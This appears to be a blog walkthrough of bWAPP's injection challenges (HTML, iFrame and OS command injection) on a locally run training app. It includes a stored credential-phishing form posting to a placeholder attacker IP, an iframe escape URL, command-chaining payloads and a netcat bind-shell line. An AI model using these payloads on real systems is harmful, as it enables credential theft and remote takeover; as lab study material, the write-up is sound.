---
layout: post
published: true
title: "A1-Injection | Solutions of bWAPP | Walkthrough of All Levels"
date: 2020-07-29 23:32:20 +0300
description: Solutions of HTML Injection - Reflected (GET), HTML Injection - Reflected (POST), HTML Injection - Reflected (Current URL), HTML Injection - Stored (Blog), iFrame Injection, LDAP Injection (Search), Mail Header Injection (SMTP), OS Command Injection, OS Command Injection - Blind, PHP Code Injection, Server-Side Includes (SSI) Injection, SQL Injection (GET/Search), SQL Injection (GET/Select), SQL Injection (POST/Search), SQL Injection (POST/Select), SQL Injection (AJAX/JSON/jQuery), SQL Injection (CAPTCHA), SQL Injection (Login Form/Hero), SQL Injection (Login Form/User), SQL Injection (SQLite), SQL Injection (Drupal), SQL Injection - Stored (Blog), SQL Injection - Stored (SQLite), SQL Injection - Stored (User-Agent), SQL Injection - Stored (XML), SQL Injection - Blind - Boolean-Based, SQL Injection - Blind - Time-Based, SQL Injection - Blind (SQLite), SQL Injection - Blind (Web Services/SOAP), XML/XPath Injection (Login Form), XML/XPath Injection (Search).
excerpt: "Writeups of all levels in A1-Injection Catagory such as HTML Injection - Reflected GET, POST, OS Command Injection, SQL Injection and XML Injections [PART I] "
image: "https://jaiguptanick.github.io/Blog/images/bwapp/a1/bWAPP_Writeup_solution_logo.png"
sitemap:
    priority: 0.8
    lastmod: 2020-07-29
    changefreq: monthly
---

<style>
/* This stylesheet sets the width of all images to 100%: */
img {
  width: 90%;
}
</style>

<h2 align="center" > </h2>
---
Here is a walkthrough and tutorial of the [bWAPP](http://www.itsecgames.com/) which is a vulnerable web application by itsecgames which you can download and test on your local machine. It has a complete list of OWASP vulnerabilities which we can practially test. <b>The best part of using bWAPP is that it is running on our local system so we have access to its source code, so if we got stuck somewhere then we can analyse its source code as it is very neat and describitive having comments wherever necessary.</b> We can see the function being used to restrict or sanatize the input,then can search for its vulnerablity on the web.

>Hello, today we are going to solve all types of injection of buggy web application such as HTML Injection - Reflected (GET), HTML Injection - Reflected (POST), HTML Injection - Reflected (Current URL), HTML Injection - Stored (Blog), iFrame Injection, LDAP Injection (Search), Mail Header Injection (SMTP), OS Command Injection, OS Command Injection - Blind, PHP Code Injection, Server-Side Includes (SSI) Injection, XML/XPath Injection (Login Form), XML/XPath Injection (Search).

## HTML Injection - Reflected (GET)
---
<h3>Security Level: low</h3>
Simply a text box, trying to input html tags inside it.

![HTML Injection get]({{ site.baseurl }}https://jaiguptanick.github.io/Blog/images/bwapp/a1/get1.png)

Yes, it works,since the method used is get we can even see input in the address bar.

![HTML Injection get]({{ site.baseurl }}https://jaiguptanick.github.io/Blog/images/bwapp/a1/get2.png)

Actually if our entered text is displayed anywhere in the page or somewhere then it may be vulnerable to HTML injection. As it is considering our input as tags not as text means we can even find juicy information by just giving it html tags.

<h3>Security Level: medium</h3>
Trying the same:

![HTML Injection get]({{ site.baseurl }}https://jaiguptanick.github.io/Blog/images/bwapp/a1/get3.png)

Now, it doesn't work as viewing the sourcecode says:

![HTML Injection get]({{ site.baseurl }}https://jaiguptanick.github.io/Blog/images/bwapp/a1/get4.png)

It actually replaces "<" and ">" with &lt and &gt respectively. Here we can not use '<' and '>' directly so we can url encode it, it becomes
`%3c%75%3e%75%6e%64%65%6c%69%6e%65%3c%2f%75%3e%20`

![HTML Injection get]({{ site.baseurl }}https://jaiguptanick.github.io/Blog/images/bwapp/a1/get5.png)

Now it worked.

<h3>Security Level: high</h3>

This is using the `htmlspecialchars()` function which restricts the use of HTML special characters such as '<', '>','"', "'", '&' so we can't injects anything malicious.There seems only one possible option if we can somehow change the browser setting form UTF-8 encoding to UTF-7 so that the page output is UTF-7 as in UTF-7, '<', '>', '"'  have different code points than UTF-8 so they are not escaped unless convert the output to UTF-8.For more detail visit [HERE](https://recalll.co/ask/v/topic/php-XSS-attack-to-bypass-htmlspecialchars%28%29-function-in-value-attribute/5a270ea51126f4451f8b49a4)

## HTML Injection - Reflected (POST)
---
This is as same as GET just the input is not displayed in the URL and is send securely. 

## HTML Injection - Reflected (Current URL)
---
<h3>Security Level: low</h3>
This was just displaying the current url.

![HTML Injection URL]({{ site.baseurl }}https://jaiguptanick.github.io/Blog/images/bwapp/a1/get6_1.png)

Not much to do so viewing the function used:

![HTML Injection URL]({{ site.baseurl }}https://jaiguptanick.github.io/Blog/images/bwapp/a1/get8.png)

It is just throwing the http host and requested URL as the output so actually we can mainpulate the HOST name and the GET url by injecting some HTML code as:

![HTML Injection URL]({{ site.baseurl }}https://jaiguptanick.github.io/Blog/images/bwapp/a1/get6.png)

This shows the output as intended:

![HTML Injection URL]({{ site.baseurl }}https://jaiguptanick.github.io/Blog/images/bwapp/a1/get7.png)

<h3>Security Level: medium</h3>

Here the function used is `$url = "<script>document.write(document.URL)</script>"; `

These type of attacks come under <b>DOM BASED XSS</b> and is restricted to Some types of old browsers which do not encode '<' and '>' in the URL. Most common vulnerable is Internet Explorer, so this attack is restricted to IE.
Using simple XXS code in the URL gives :

![HTML Injection URL]({{ site.baseurl }}https://jaiguptanick.github.io/Blog/images/bwapp/a1/urlm1.png)

Can read more about the related DOM Based XSS [HERE](https://www.acunetix.com/blog/articles/dom-xss-explained/).

<h3>Security Level: high</h3>

Here we can't use the above DOM XSS as htmlspecialchars() function is used to sanitize the URL.

## HTML Injection - Stored (Blog)
---
<h3>Security Level: low</h3>
Seeing Text Box means, which is reflecting Data on the page. First thing comes in mind to put and see whether it is executing HTML code or not.

![HTML Injection stored]({{ site.baseurl }}https://jaiguptanick.github.io/Blog/images/bwapp/a1/stored_easy_1.png)

Yes, it is executing:

![HTML Injection stored]({{ site.baseurl }}https://jaiguptanick.github.io/Blog/images/bwapp/a1/stored_easy_2.png)

Now we can even do **much more** than XSS like placing an **iframe for phising attacks** or even placing a new **Malicious Login Form** which sends the data to us. Lets see How??

Placing this HTML in the box:
```
<div class="test_code">test</div>
<div style="position: absolute; left: 0px; top: 0px; width: 800px; height: 600px; z-index: 1000; background-color:white;">
Please Login Here To Proceed:
<form name="login" action="http://[ATTACKER_IP]:1234/hacked.html" method="post">
<table>
<tr>
<td>Username:</td>
<td><input type="text" name="username"/></td>
</tr>
<tr>
<td>Password:</td>
<td><input type="password" name="passwd"/></td>
</tr>
</table>
<input type="submit" value="Login"/>
</form></div>
```
![HTML Injection stored]({{ site.baseurl }}https://jaiguptanick.github.io/Blog/images/bwapp/a1/stored_easy_3.png)

Setting up the Natcat listener

![HTML Injection stored]({{ site.baseurl }}https://jaiguptanick.github.io/Blog/images/bwapp/a1/stored_easy_4.png)

Now submit the code, this shows the Login form to the user as:

![HTML Injection stored]({{ site.baseurl }}https://jaiguptanick.github.io/Blog/images/bwapp/a1/stored_easy_3_1.png)

When user fills their detail to this form, it will send us the request to our netcat listener as:

![HTML Injection stored]({{ site.baseurl }}https://jaiguptanick.github.io/Blog/images/bwapp/a1/stored_easy_5.png)

<h3>Security Level: medium & hard </h3>

The above code is not working in this level, rather displaying the tags as text.

![HTML Injection stored]({{ site.baseurl }}https://jaiguptanick.github.io/Blog/images/bwapp/a1/stored.png)

If we look at the source code then:

![HTML Injection stored]({{ site.baseurl }}https://jaiguptanick.github.io/Blog/images/bwapp/a1/stored_medium_hard.png)

This is passing the input data in the xxs_check_3 function for medium(1) and hard(2) level which is using `htmlspecialchars()` function which restricts the use of HTML special characters such as ‘<’, ‘>’,’”’, “’”, ‘&’ so we can’t injects HTML as tags are blocked.

## iFrame Injection
---
>The iframe tag specifies an inline frame, which is used to embed another document or page within a current HTML document.

<h3>Security Level: low</h3>
The iframe is displaying robots.txt in the current page.

![HTML Iframe Injection]({{ site.baseurl }}https://jaiguptanick.github.io/Blog/images/bwapp/a1/iframe_1.png)

In this challenge the iframe which has GET parameter in the URL such as ParamUrl, ParamWidth and ParamHeigh. We can eaily change the robots.txt to any other URL for example I changed it to [https://jaiguptanick.github.io/Blog/blog/Overpass_TryHackMe/](https://jaiguptanick.github.io/Blog/blog/Overpass_TryHackMe/) , it displayed the requested webpage.

![HTML Iframe Injection]({{ site.baseurl }}https://jaiguptanick.github.io/Blog/images/bwapp/a1/iframe_2.png)

<h3>Security Level: Medium</h3>

In medium(1) level they are using the ```addslashes() ``` function under xss function.Which will eventually add a "\" before single quote ('), double quote ("), backslash ( \ ) and NUL (the NULL byte).

![HTML Iframe Injection]({{ site.baseurl }}https://jaiguptanick.github.io/Blog/images/bwapp/a1/iframe_4.png)

But we can escape this by using the **srcdoc** attribute of iframe tag as replaces the content of "src" attribute and then inserting another tag for a new iframe tag. The final URL becomes <br> `https://localhost/bwapp/iframei.php?ParamUrl=robots.txt&ParamWidth=250&ParamHeight=250" srcdoc></iframe><iframe src=https://jaiguptanick.github.io/Blog/blog/Web-easy/ width=800 height=300>" `

![HTML Iframe Injection]({{ site.baseurl }}https://jaiguptanick.github.io/Blog/images/bwapp/a1/iframe_5.png)

It successfully replaces the iframe restriction, and displayed the required result.
<h3>Security Level: High</h3>
This is using `htmlspecialchars()` function which restricts the use of HTML special characters such as ‘<’, ‘>’,’”’, “’”, ‘&’ so we can’t injects HTML as tags are blocked:(

## OS Command Injection
---
<h3>Security Level: low</h3>
OS command injections comes into play when the code is requesting the commandline to run a command,so we can alter the requested command and provide the malicious query.
<b>Some useful commands to check for OS vulnerability:-</b>

| Purpose of command | Linux | Windows |
| :----------------: | :---: | :-----: |
| Name of current user | whoami | whoami |
| Operating system | uname -a | ver |
| Network configuration | ifconfig | ipconfig /all |
| Network connections | netstat -an	netstat -an |
| Running processes | ps -ef | tasklist |

Here it is using the <code>shell_exec("nslookup  " . commandi($target))</code> nslookup tool to find the DNS record of the provided domain.

![OS commmand injection]({{ site.baseurl }}https://jaiguptanick.github.io/Blog/images/bwapp/a1/os_easy_1.png)

Since it is passing the command ```nslookup www.www.nsa.gov ``` to the commadline we can alter this by using pipe as``` nslookup www.www.nsa.gov | {malicious command} ``` For example:

![OS commmand injection]({{ site.baseurl }}https://jaiguptanick.github.io/Blog/images/bwapp/a1/os_easy_1_1.png)

Here we used the ```www.nsa.gov | time ```
we can even use other commands such as
```www.nsa.gov ; time ```  or ```www.nsa.gov && time ```

The OS Command injection can sometime be very mailcious as we can even get a remote shell by using the command:
```www.nsa.gov ; nc -vlp 1234 -e /bin/bash ```

<h3>Security Level: medium</h3>

The command ```www.nsa.gov | time ``` works here. 

![OS commmand injection]({{ site.baseurl }}https://jaiguptanick.github.io/Blog/images/bwapp/a1/os_medium_2.png)

As the function used by the server blocks the use of '&' and ; but we can use pipe as before.

<h3>Security Level: high</h3>

Here they are using ```escapeshellcmd(); ``` function which ensure that user execute only one command user can specify unlimited number of parameters user cannot execute different command. This was exploitable in the earlier versions of PHP. Read more [HERE](https://github.com/kacperszurek/exploits/blob/master/GitList/exploit-bypass-php-escapeshellarg-escapeshellcmd.md#argument-injection)

## OS Command Injection - Blind
---
<h3>Security Level: low</h3>

<h3>Security Level: medium</h3>

<h3>Security Level: high</h3>

All SQL challanges are covered in PART II of A1-Injection.<br>
<i>Thanks for your patience, I hope you enjoyed reading. Happy Hacking... </i>
